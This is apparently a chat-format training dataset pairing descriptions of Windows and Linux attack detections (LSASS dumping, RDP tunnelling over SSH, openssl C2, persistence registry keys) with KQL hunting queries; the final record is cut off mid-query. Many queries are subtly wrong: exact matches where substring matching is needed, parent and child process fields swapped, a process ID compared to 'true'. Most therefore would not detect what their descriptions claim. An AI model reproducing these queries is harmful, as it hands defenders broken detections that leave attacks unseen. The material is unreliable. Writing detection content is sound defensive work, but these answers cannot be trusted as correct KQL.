{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects modification of autostart extensibility point (ASEP) in registry. Topic: registry_set_asep_reg_keys_modification_session_manager"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\System\\\\CurrentControlSet\\\\Control\\\\Session Manager\" and (RegistryKey contains \"\\\\SetupExecute\" or RegistryKey contains \"\\\\S0InitialCommand\" or RegistryKey contains \"\\\\KnownDlls\" or RegistryKey contains \"\\\\Execute\" or RegistryKey contains \"\\\\BootExecute\" or RegistryKey contains \"\\\\AppCertDlls\") and (not(RegistryValueData =~ \"(Empty)\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the addition of new root, CA or AuthRoot certificates to the Windows registry Topic: registry_set_install_root_or_ca_certificat"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\SystemCertificates\\\\Root\\\\Certificates*\" or RegistryKey endswith \"\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\SystemCertificates\\\\Root\\\\Certificates*\" or RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\EnterpriseCertificates\\\\Root\\\\Certificates*\" or RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\SystemCertificates\\\\CA\\\\Certificates*\" or RegistryKey endswith \"\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\SystemCertificates\\\\CA\\\\Certificates*\" or RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\EnterpriseCertificates\\\\CA\\\\Certificates*\" or RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\SystemCertificates\\\\AuthRoot\\\\Certificates*\" or RegistryKey endswith \"\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\SystemCertificates\\\\AuthRoot\\\\Certificates*\" or RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\EnterpriseCertificates\\\\AuthRoot\\\\Certificates*\") and RegistryKey endswith \"\\\\Blob\" and RegistryValueData =~ \"Binary Data\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential initial exploitation attempts against VMware Horizon deployments running a vulnerable versions of Log4j.\n Topic: proc_creation_win_exploit_cve_2021_44228_vmware_horizon_log4j"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\ws_TomcatService.exe\" and (not((InitiatingProcessFolderPath in~ (\"\\\\cmd.exe\", \"\\\\powershell.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious process spawning from an Outlook process. Topic: proc_creation_win_office_outlook_susp_child_processes"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\OUTLOOK.EXE\" and (InitiatingProcessFolderPath in~ (\"\\\\AppVLP.exe\", \"\\\\bash.exe\", \"\\\\cmd.exe\", \"\\\\cscript.exe\", \"\\\\forfiles.exe\", \"\\\\hh.exe\", \"\\\\mftrace.exe\", \"\\\\msbuild.exe\", \"\\\\msdt.exe\", \"\\\\mshta.exe\", \"\\\\msiexec.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\regsvr32.exe\", \"\\\\schtasks.exe\", \"\\\\scrcons.exe\", \"\\\\scriptrunner.exe\", \"\\\\sh.exe\", \"\\\\svchost.exe\", \"\\\\wmic.exe\", \"\\\\wscript.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n Topic: proc_creation_win_remote_access_tools_logmein"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoFileDescription =~ \"LMIGuardianSvc\" or ProcessVersionInfoProductName =~ \"LMIGuardianSvc\" or ProcessVersionInfoCompanyName =~ \"LogMeIn, Inc.\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the setting of the \"DumpType\" registry value to \"2\" which stands for a \"Full Dump\". Technique such as LSASS Shtinkering requires this value to be \"2\" in order to dump LSASS. Topic: registry_set_lsass_usermode_dumping"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\LocalDumps\\\\DumpType\" or RegistryKey contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\LocalDumps\\\\lsass.exe\\\\DumpType\") and RegistryValueData =~ \"DWORD (0x00000002)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Attempts to load dismcore.dll after dropping it Topic: image_load_uac_bypass_via_dism"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath endswith \"\\\\dismcore.dll\" and InitiatingProcessFolderPath =~ \"\\\\dism.exe\") and (not(FolderPath =~ \"C:\\\\Windows\\\\System32\\\\Dism\\\\dismcore.dll\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Powershell as a child of the WmiPrvSE process. Which could be a sign of lateral movement via WMI. Topic: proc_creation_win_wmiprvse_spawns_powershell"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\"))) and InitiatingProcessFileName =~ \"\\\\WmiPrvSE.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a network connection initiated by a binary to \"api.mega.co.nz\".\nAttackers were seen abusing file sharing websites similar to \"mega.nz\" in order to upload/download additional payloads.\n Topic: net_connection_win_domain_mega_nz"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where InitiatingProcessId =~ \"true\" and (RemoteUrl in~ (\"mega.co.nz\", \"mega.nz\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Execution of ssh.exe to perform data exfiltration and tunneling through RDP Topic: proc_creation_win_ssh_rdp_tunneling"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \":3389\" and InitiatingProcessFolderPath =~ \"\\\\ssh.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when an attacker registers a new IFilter for an extension. Microsoft Windows Search uses filters to extract the content of items for inclusion in a full-text index.\nYou can extend Windows Search to index new or proprietary file types by writing filters to extract the content, and property handlers to extract the properties of files.\n Topic: registry_set_persistence_ifilter"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ((RegistryKey contains \"\\\\SOFTWARE\\\\Classes\\\\CLSID\" and RegistryKey contains \"\\\\PersistentAddinsRegistered\\\\{89BCB740-6119-101A-BCB7-00DD010655AF}\") or (RegistryKey contains \"\\\\SOFTWARE\\\\Classes\\\\.\" and RegistryKey contains \"\\\\PersistentHandler\")) and (not(((RegistryKey endswith \"\\\\CLSID\\\\{4F46F75F-199F-4C63-8B7D-86D48FE7970C}*\" or RegistryKey endswith \"\\\\CLSID\\\\{4887767F-7ADC-4983-B576-88FB643D6F79}*\" or RegistryKey endswith \"\\\\CLSID\\\\{D3B41FA1-01E3-49AF-AA25-1D0D824275AE}*\" or RegistryKey endswith \"\\\\CLSID\\\\{72773E1A-B711-4d8d-81FA-B9A43B0650DD}*\" or RegistryKey endswith \"\\\\CLSID\\\\{098f2470-bae0-11cd-b579-08002b30bfeb}*\" or RegistryKey endswith \"\\\\CLSID\\\\{1AA9BF05-9A97-48c1-BA28-D9DCE795E93C}*\" or RegistryKey endswith \"\\\\CLSID\\\\{2e2294a9-50d7-4fe7-a09f-e6492e185884}*\" or RegistryKey endswith \"\\\\CLSID\\\\{34CEAC8D-CBC0-4f77-B7B1-8A60CB6DA0F7}*\" or RegistryKey endswith \"\\\\CLSID\\\\{3B224B11-9363-407e-850F-C9E1FFACD8FB}*\" or RegistryKey endswith \"\\\\CLSID\\\\{3DDEB7A4-8ABF-4D82-B9EE-E1F4552E95BE}*\" or RegistryKey endswith \"\\\\CLSID\\\\{5645C8C1-E277-11CF-8FDA-00AA00A14F93}*\" or RegistryKey endswith \"\\\\CLSID\\\\{5645C8C4-E277-11CF-8FDA-00AA00A14F93}*\" or RegistryKey endswith \"\\\\CLSID\\\\{58A9EBF6-5755-4554-A67E-A2467AD1447B}*\" or RegistryKey endswith \"\\\\CLSID\\\\{5e941d80-bf96-11cd-b579-08002b30bfeb}*\" or RegistryKey endswith \"\\\\CLSID\\\\{698A4FFC-63A3-4E70-8F00-376AD29363FB}*\" or RegistryKey endswith \"\\\\CLSID\\\\{7E9D8D44-6926-426F-AA2B-217A819A5CCE}*\" or RegistryKey endswith \"\\\\CLSID\\\\{8CD34779-9F10-4f9b-ADFB-B3FAEABDAB5A}*\" or RegistryKey endswith \"\\\\CLSID\\\\{9694E38A-E081-46ac-99A0-8743C909ACB6}*\" or RegistryKey endswith \"\\\\CLSID\\\\{98de59a0-d175-11cd-a7bd-00006b827d94}*\" or RegistryKey endswith \"\\\\CLSID\\\\{AA10385A-F5AA-4EFF-B3DF-71B701E25E18}*\" or RegistryKey endswith \"\\\\CLSID\\\\{B4132098-7A03-423D-9463-163CB07C151F}*\" or RegistryKey endswith \"\\\\CLSID\\\\{d044309b-5da6-4633-b085-4ed02522e5a5}*\" or RegistryKey endswith \"\\\\CLSID\\\\{D169C14A-5148-4322-92C8-754FC9D018D8}*\" or RegistryKey endswith \"\\\\CLSID\\\\{DD75716E-B42E-4978-BB60-1497B92E30C4}*\" or RegistryKey endswith \"\\\\CLSID\\\\{E2F83EED-62DE-4A9F-9CD0-A1D40DCD13B6}*\" or RegistryKey endswith \"\\\\CLSID\\\\{E772CEB3-E203-4828-ADF1-765713D981B8}*\" or RegistryKey contains \"\\\\CLSID\\\\{eec97550-47a9-11cf-b952-00aa0051fe20}\" or RegistryKey endswith \"\\\\CLSID\\\\{FB10BD80-A331-4e9e-9EB7-00279903AD99}*\") or (InitiatingProcessFolderPath in~ (\"C:\\\\Windows\\\\System32\\\\\", \"C:\\\\Program Files (x86)\\\\\", \"C:\\\\Program Files\\\\\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects PowerShell creating a binary executable or a script file. Topic: file_event_win_powershell_drop_binary_or_script"}, {"role": "assistant", "content": "DeviceFileEvents\n| where ((FileName in~ (\".bat\", \".chm\", \".cmd\", \".com\", \".dll\", \".exe\", \".hta\", \".jar\", \".js\", \".ocx\", \".scr\", \".sys\", \".vbe\", \".vbs\", \".wsf\")) and (InitiatingProcessFolderPath in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\"))) and (not((FileName in~ (\"C:\\\\Windows\\\\Temp\\\\\", \"\\\\AppData\\\\Local\\\\Temp\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects process injection using the signed Windows tool \"Mavinject\" via the \"INJECTRUNNING\" flag Topic: proc_creation_win_lolbin_mavinject_process_injection"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" /INJECTRUNNING \" and (not(InitiatingProcessFileName =~ \"C:\\\\Windows\\\\System32\\\\AppVClient.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of netsh with the \"trace\" flag in order to start a network capture Topic: proc_creation_win_netsh_packet_capture"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"trace\", \"start\")) and (FolderPath endswith \"\\\\netsh.exe\" or ProcessVersionInfoOriginalFileName =~ \"netsh.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"openssl\" to connect to an IP address. This techniques was used by UNC4841 to exfiltrate SSL certificates and as a C2 channel with named pipes. Investigate commands executed in the temporal vicinity of this command. Topic: proc_creation_lnx_apt_unc4841_openssl_connection"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine matches regex \"[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\" and (ProcessCommandLine in~ (\":443\", \":8080\")) and InitiatingProcessFolderPath =~ \"/openssl\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious process command line that uses whoami as first parameter (as e.g. used by EfsPotato) Topic: proc_creation_win_susp_whoami_as_param"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \".exe whoami\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Obfuscated Powershell via COMPRESS OBFUSCATION Topic: proc_creation_win_hktl_invoke_obfuscation_via_compress"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"system.io.compression.deflatestream\", \"system.io.streamreader\", \"readtoend(\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services.\nAdversaries may use flaws in the permissions for registry to redirect from the originally specified executable to one that they control, in order to launch their own code at Service start.\nWindows stores local service configuration information in the Registry under HKLM\\SYSTEM\\CurrentControlSet\\Services\n Topic: proc_creation_win_reg_service_imagepath_change"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"add \", \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\\", \" ImagePath \")) and InitiatingProcessFolderPath =~ \"\\\\reg.exe\") and (ProcessCommandLine contains \" -d \" or ProcessCommandLine contains \" /d \" or ProcessCommandLine contains \" \u2013d \" or ProcessCommandLine contains \" \u2014d \" or ProcessCommandLine contains \" \u2015d \")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious IIS native-code module installations via command line Topic: proc_creation_win_iis_appcmd_susp_module_install"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((ProcessCommandLine contains \"-name:\" or ProcessCommandLine contains \"/name:\" or ProcessCommandLine contains \"\u2013name:\" or ProcessCommandLine contains \"\u2014name:\" or ProcessCommandLine contains \"\u2015name:\") and (ProcessCommandLine in~ (\"install\", \"module\"))) and (FolderPath endswith \"\\\\appcmd.exe\" or ProcessVersionInfoOriginalFileName =~ \"appcmd.exe\")) and (not(InitiatingProcessFileName =~ \"C:\\\\Windows\\\\System32\\\\inetsrv\\\\iissetup.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Monitor the creation of a new key under TaskCache when a new scheduled task is registered by a process that is not svchost.exe, which is suspicious Topic: registry_set_taskcache_entry"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Schedule\\\\TaskCache*\" and (not(((RegistryKey contains \"Microsoft\\\\Windows\\\\UpdateOrchestrator\" or RegistryKey contains \"Microsoft\\\\Windows\\\\SoftwareProtectionPlatform\\\\SvcRestartTask\\\\Index\" or RegistryKey contains \"Microsoft\\\\Windows\\\\Flighting\\\\OneSettings\\\\RefreshCache\\\\Index\") or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\Dropbox\\\\Update\\\\DropboxUpdate.exe\", \"C:\\\\Program Files\\\\Dropbox\\\\Update\\\\DropboxUpdate.exe\")) or (InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\explorer.exe\" and RegistryKey endswith \"\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Schedule\\\\TaskCache\\\\Tree\\\\Microsoft\\\\Windows\\\\PLA\\\\Server Manager Performance Monitor*\") or InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\System32\\\\msiexec.exe\" or (InitiatingProcessFolderPath =~ \"\\\\ngen.exe\" and (RegistryKey contains \"\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Schedule\\\\TaskCache\\\\Tasks\\\\{B66B135D-DA06-4FC4-95F8-7458E1D10129}\" or RegistryKey contains \"\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Schedule\\\\TaskCache\\\\Tree\\\\Microsoft\\\\Windows\\\\.NET Framework\\\\.NET Framework NGEN\")) or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Integration\\\\Integrator.exe\", \"C:\\\\Program Files (x86)\\\\Microsoft Office\\\\root\\\\Integration\\\\Integrator.exe\")) or InitiatingProcessFolderPath =~ \"C:\\\\WINDOWS\\\\system32\\\\svchost.exe\" or InitiatingProcessFolderPath =~ \"System\" or InitiatingProcessFolderPath =~ \"\\\\TiWorker.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of the MSXSL utility. This can be used to execute Extensible Stylesheet Language (XSL) files. These files are commonly used to describe the processing and rendering of data within XML files.\nAdversaries can abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses.\n Topic: proc_creation_win_msxsl_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\msxsl.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of \"RjvPlatform.dll\" by \"SystemResetPlatform.exe\" located in a non-default location. Topic: image_load_side_load_rjvplatform_non_default_location"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (InitiatingProcessFolderPath =~ \"\\\\SystemResetPlatform.exe\" and FolderPath endswith \"\\\\RjvPlatform.dll\") and (not(InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\System32\\\\SystemResetPlatform\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects file writes of WMI script event consumer Topic: file_event_win_wmi_persistence_script_event_consumer_write"}, {"role": "assistant", "content": "DeviceFileEvents\n| where InitiatingProcessFolderPath =~ \"C:\\\\WINDOWS\\\\system32\\\\wbem\\\\scrcons.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation or modification of the Windows Terminal Profile settings file \"settings.json\" by an uncommon process. Topic: file_event_win_susp_windows_terminal_profile"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\\\LocalState\\\\settings.json\" and (InitiatingProcessFolderPath in~ (\"\\\\cmd.exe\", \"\\\\cscript.exe\", \"\\\\mshta.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\wscript.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when an attacker tries to add a new network provider in order to dump clear text credentials, similar to how the NPPSpy tool does it Topic: proc_creation_win_registry_new_network_provider"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"\\\\System\\\\CurrentControlSet\\\\Services\\\\\", \"\\\\NetworkProvider\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"DXCap.EXE\" with the \"-c\" flag, which allows a user to launch any arbitrary binary or windows package through DXCap itself. This can be abused to potentially bypass application whitelisting.\n Topic: proc_creation_win_dxcap_arbitrary_binary_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" -c \" and (FolderPath endswith \"\\\\DXCap.exe\" or ProcessVersionInfoOriginalFileName =~ \"DXCap.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects uncommon child processes of the Add-In deployment cache updating utility (AddInutil.exe) which could be a sign of potential abuse of the binary to proxy execution via a custom Addins.Store payload.\n Topic: proc_creation_win_addinutil_uncommon_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\addinutil.exe\" and (not((InitiatingProcessFolderPath in~ (\":\\\\Windows\\\\System32\\\\conhost.exe\", \":\\\\Windows\\\\System32\\\\werfault.exe\", \":\\\\Windows\\\\SysWOW64\\\\werfault.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries may establish persistence by executing malicious content triggered by user inactivity.\nScreensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension\n Topic: file_event_win_creation_scr_binary_file"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".scr\" and (not(((InitiatingProcessFolderPath in~ (\"\\\\Kindle.exe\", \"\\\\Bin\\\\ccSvcHst.exe\")) or (FileName =~ \"\\\\uwfservicingscr.scr\" and InitiatingProcessFolderPath =~ \"\\\\TiWorker.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects unusually long PowerShell command lines with a length of 1000 characters or more Topic: proc_creation_win_powershell_abnormal_commandline_size"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\")) or ProcessVersionInfoFileDescription =~ \"Windows Powershell\" or ProcessVersionInfoProductName =~ \"PowerShell Core 6\") and ProcessCommandLine matches regex \".{1000,}\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects uses of the createdump.exe LOLOBIN utility to dump process memory Topic: proc_creation_win_createdump_lolbin_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -u \", \" --full \", \" -f \", \" --name \", \".dmp \")) and (FolderPath endswith \"\\\\createdump.exe\" or ProcessVersionInfoOriginalFileName =~ \"FX_VER_INTERNALNAME_STR\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the \"Import-Module\" cmdlet in order to add new Cmdlets to the current PowerShell session Topic: proc_creation_win_powershell_import_module"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"Import-Module \", \"ipmo \")) and ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\")))) and (not(((InitiatingProcessFileName in~ (\":\\\\Program Files\\\\WindowsApps\\\\Microsoft.WindowsTerminal_\", \":\\\\Windows\\\\System32\\\\cmd.exe\")) and (ProcessCommandLine in~ (\":\\\\Program Files\\\\Microsoft Visual Studio\\\\\", \"Tools\\\\Microsoft.VisualStudio.DevShell.dll\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of Jlaive to execute assemblies in a copied PowerShell Topic: proc_creation_win_hktl_jlaive_batch_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessCommandLine =~ \".bat\" and InitiatingProcessFileName =~ \"\\\\cmd.exe\") and (((ProcessCommandLine in~ (\"powershell.exe\", \".bat.exe\")) and InitiatingProcessFolderPath =~ \"\\\\xcopy.exe\") or ((ProcessCommandLine in~ (\"pwsh.exe\", \".bat.exe\")) and InitiatingProcessFolderPath =~ \"\\\\xcopy.exe\") or ((ProcessCommandLine in~ (\"+s\", \"+h\", \".bat.exe\")) and InitiatingProcessFolderPath =~ \"\\\\attrib.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Extract data from cab file and hide it in an alternate data stream Topic: proc_creation_win_lolbin_extrac32_ads"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine matches regex \":[^\\\\\\\\]\" and (ProcessCommandLine in~ (\"extrac32.exe\", \".cab\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the PsLogList utility to dump event log in order to extract admin accounts and perform account discovery or delete events logs Topic: proc_creation_win_sysinternals_psloglist"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" security\", \" application\", \" system\")) and (ProcessCommandLine contains \" -d\" or ProcessCommandLine contains \" /d\" or ProcessCommandLine contains \" \u2013d\" or ProcessCommandLine contains \" \u2014d\" or ProcessCommandLine contains \" \u2015d\" or ProcessCommandLine contains \" -x\" or ProcessCommandLine contains \" /x\" or ProcessCommandLine contains \" \u2013x\" or ProcessCommandLine contains \" \u2014x\" or ProcessCommandLine contains \" \u2015x\" or ProcessCommandLine contains \" -s\" or ProcessCommandLine contains \" /s\" or ProcessCommandLine contains \" \u2013s\" or ProcessCommandLine contains \" \u2014s\" or ProcessCommandLine contains \" \u2015s\" or ProcessCommandLine contains \" -c\" or ProcessCommandLine contains \" /c\" or ProcessCommandLine contains \" \u2013c\" or ProcessCommandLine contains \" \u2014c\" or ProcessCommandLine contains \" \u2015c\" or ProcessCommandLine contains \" -g\" or ProcessCommandLine contains \" /g\" or ProcessCommandLine contains \" \u2013g\" or ProcessCommandLine contains \" \u2014g\" or ProcessCommandLine contains \" \u2015g\") and (ProcessVersionInfoOriginalFileName =~ \"psloglist.exe\" or (FolderPath endswith \"\\\\psloglist.exe\" or FolderPath endswith \"\\\\psloglist64.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious DACL modifications to allow access to a service from a suspicious trustee. This can be used to override access restrictions set by previous ACLs. Topic: proc_creation_win_sc_sdset_allow_service_changes"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\sc.exe\" or ProcessVersionInfoOriginalFileName =~ \"sc.exe\") and (ProcessCommandLine in~ (\"sdset\", \"A;\")) and (ProcessCommandLine in~ (\";IU\", \";SU\", \";BA\", \";SY\", \";WD\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when an attacker modifies values of the Disk Cleanup Handler in the registry to achieve persistence.\nThe disk cleanup manager is part of the operating system. It displays the dialog box [\u2026]\nThe user has the option of enabling or disabling individual handlers by selecting or clearing their check box in the disk cleanup managers UI.\nAlthough Windows comes with a number of disk cleanup handlers, they arent designed to handle files produced by other applications.\nInstead, the disk cleanup manager is designed to be flexible and extensible by enabling any developer to implement and register their own disk cleanup handler.\nAny developer can extend the available disk cleanup services by implementing and registering a disk cleanup handler.\n Topic: registry_add_persistence_disk_cleanup_handler_entry"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (ActionType =~ \"RegistryKeyCreated\" and RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\VolumeCaches*\") and (not((RegistryKey endswith \"\\\\Active Setup Temp Folders\" or RegistryKey endswith \"\\\\BranchCache\" or RegistryKey endswith \"\\\\Content Indexer Cleaner\" or RegistryKey endswith \"\\\\D3D Shader Cache\" or RegistryKey endswith \"\\\\Delivery Optimization Files\" or RegistryKey endswith 